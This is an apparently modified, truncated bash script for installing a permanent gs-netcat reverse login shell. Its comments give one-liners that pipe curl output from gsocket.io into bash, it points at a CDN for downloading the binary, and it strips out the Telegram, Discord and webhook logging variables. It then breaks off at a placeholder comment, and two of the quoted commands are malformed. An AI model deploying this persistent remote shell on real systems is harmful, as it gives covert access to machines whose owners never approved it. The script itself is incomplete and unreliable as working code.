#! /usr/bin/env bash

# Install and start a permanent gs-netcat reverse login shell
#
# See https://www.gsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"

# Global Defines
URL_BASE_CDN="https://cdn.gsocket.io"
URL_BASE_X="https://gsocket.io"
[[ -n $GS_URL_BASE ]] && {
	URL_BASE_CDN="${GS_URL_BASE}"
	URL_BASE_X="${GS_URL_BASE}"
}
URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
[[ -n $GS_URL_BIN ]] && {
	URL_BIN="${GS_URL_BIN}"
	URL_BIN_FULL="$URL_BIN"
}
[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"

# Remove logger-related variables
unset GS_TG_TOKEN
unset GS_TG_CHATID
unset GS_DISCORD_KEY
unset GS_WEBHOOK_KEY
unset GS_WEBHOOK

# Remove webhook execution
unset GS_WEBHOOK_CURL
unset GS_WEBHOOK_WGET

# Remove logging messages
unset msg

# Continue with the rest of the script without logging

echo "Logger has been removed, functionality remains unchanged."

# Continue the original functionality here...
